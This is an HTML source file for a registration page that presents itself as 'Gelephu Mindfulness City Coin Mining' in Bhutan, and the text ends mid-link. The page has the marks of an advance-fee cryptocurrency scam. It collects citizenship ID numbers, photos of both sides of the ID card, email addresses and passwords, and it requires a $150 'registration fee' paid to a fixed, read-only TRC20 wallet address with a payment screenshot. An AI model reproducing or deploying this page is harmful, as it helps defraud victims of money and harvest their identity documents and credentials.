# GMCC-mining-1st-Batch-Project

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Registration - BHUTAN Ter Coin Mining</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Arial', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      background: linear-gradient(135deg, #f0f4f8, #d9e2ec);
      color: #333;
    }

    .container {
      text-align: left;
      background-color: #ffffff;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0px 6px 12px rgba(0, 0, 0, 0.15);
      max-width: 600px;
      width: 100%;
    }

    h1 {
      font-size: 28px;
      color: #333;
      font-weight: bold;
      margin-bottom: 15px;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    h2 {
      font-size: 22px;
      color: #4CAF50;
      font-weight: 600;
      margin-bottom: 20px;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .announcement {
      font-size: 18px;
      color: blue;
      font-weight: bold;
      margin-bottom: 20px;
    }

    .announcement span {
      color: #333;
      font-weight: normal;
    }

    label {
      font-weight: bold;
      margin-bottom: 5px;
      display: block;
    }

    input, select, button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 5px;
      font-size: 16px;
      border: 1px solid #ccc;
    }

    button {
      background-color: #4CAF50;
      color: white;
      border: none;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background-color: #45a049;
    }

    .note {
      color: red;
      font-weight: bold;
      margin-top: 20px;
    }

    .dzongkhag-select {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 5px;
      font-size: 16px;
      border: 1px solid #ccc;
    }

    .input-group {
      display: flex;
      flex-direction: column;
      gap: 10px;
    }

    .file-upload {
      display: flex;
      justify-content: space-between;
    }

    .bank-link {
      margin-top: 30px;
      text-align: center;
    }

    .bank-link a {
      font-size: 18px;
      color: #4CAF50;
      text-decoration: none;
      font-weight: bold;
    }

    .bank-link a:hover {
      color: #45a049;
    }

    /* Registration Fee in Red */
    .registration-fee {
      font-size: 18px;
      font-weight: bold;
      color: red;
      margin-top: 20px;
    }

    /* Success Message Style */
    .success-message {
      text-align: center;
      font-size: 20px;
      color: green;
      font-weight: bold;
      display: none;
    }

    /* Additional Information in Green */
    .additional-info {
      color: green;
      font-weight: bold;
      font-size: 18px;
      margin-top: 30px;
    }

    .social-links {
      display: flex;
      justify-content: space-around;
      margin-top: 20px;
    }

    .social-link {
      font-size: 16px;
      color: #4CAF50;
      text-decoration: none;
      font-weight: bold;
      display: flex;
      align-items: center;
      gap: 5px;
    }

    .social-link:hover {
      color: #45a049;
    }

    /* Registration Verification Note */
    .verification-note {
      color: green;
      font-weight: bold;
      font-size: 16px;
      margin-top: 20px;
      text-align: center;
    }

  </style>
</head>
<body>

  <div class="container">
    <!-- Announcement Text -->
    <p class="announcement"><strong>Announcement:</strong> <span>This Registration is for 50,000 people for the 1st Batch of mining TER Coin in ORO Bank.</span></p>

    <h1>Gelephu Mindfulness City Coin Mining (GMCC)</h1>
    <h2>Registration Form</h2>

    <form id="registration-form" onsubmit="return handleSubmit(event)">
      <div class="input-group">
        <label for="first-name">First Name</label>
        <input type="text" id="first-name" name="first-name" required>

        <label for="middle-name">Middle Name (Optional)</label>
        <input type="text" id="middle-name" name="middle-name">

        <label for="last-name">Last Name</label>
        <input type="text" id="last-name" name="last-name" required>

        <label for="dzongkhag">Dzongkhag</label>
        <select id="dzongkhag" name="dzongkhag" class="dzongkhag-select" required>
          <option value="">Select Dzongkhag</option>
          <option value="Thimphu">Thimphu</option>
          <option value="Paro">Paro</option>
          <option value="Chhukha">Chhukha</option>
          <option value="Dagana">Dagana</option>
          <option value="Haa">Haa</option>
          <option value="Gasa">Gasa</option>
          <option value="Punakha">Punakha</option>
          <option value="Wangdue Phodrang">Wangdue Phodrang</option>
          <option value="Tsirang">Tsirang</option>
          <option value="Sarpang">Sarpang</option>
          <option value="Bumthang">Bumthang</option>
          <option value="Zhemgang">Zhemgang</option>
          <option value="Mongar">Mongar</option>
          <option value="Lhuntse">Lhuntse</option>
          <option value="Trashigang">Trashigang</option>
          <option value="Trashiyangtse">Trashiyangtse</option>
          <option value="Samdrup Jongkhar">Samdrup Jongkhar</option>
          <option value="Pemagatshel">Pemagatshel</option>
          <option value="Samtse">Samtse</option>
        </select>

        <label for="cid">Citizenship ID Card Number</label>
        <input type="text" id="cid" name="cid" required>

        <div class="file-upload">
          <div>
            <label for="cid-front">Documents CID Front Side Photo</label>
            <input type="file" id="cid-front" name="cid-front" accept="image/*" required>
          </div>
          <div>
            <label for="cid-back">Documents CID Back Side Photo</label>
            <input type="file" id="cid-back" name="cid-back" accept="image/*" required>
          </div>
        </div>

        <label for="phone">Phone Number</label>
        <input type="text" id="phone" name="phone" required>

        <label for="email">Email (Gmail)</label>
        <input type="email" id="email" name="email" required>

        <label for="password">Password</label>
        <input type="password" id="password" name="password" required>

        <label for="confirm-password">Confirm Password</label>
        <input type="password" id="confirm-password" name="confirm-password" required>

        <label for="address">TRC20 Address</label>
        <input type="text" id="address" name="address" value="TMuWGYnqYxGSXgD9sfe3m1aUfNk2JW8Aci" readonly>

        <!-- Registration Fee Message Now Below TRC20 Address -->
        <p class="registration-fee">Registration Fee: $150 (Before payment, please complete all details.)</p>

        <p class="note">Fake payment screenshots are prohibited and will disqualify your registration.</p>

        <label for="payment-screenshot">Payment Screenshot (Required)</label>
        <input type="file" id="payment-screenshot" name="payment-screenshot" accept="image/*" required>

      </div>

      <button type="submit">Submit Registration</button>
    </form>

</dvi> Your registration verification after 72 hours and will provide a userid and pin on registered phone number and gmail
    <div class="bank-link">
      <p><a href="https://www
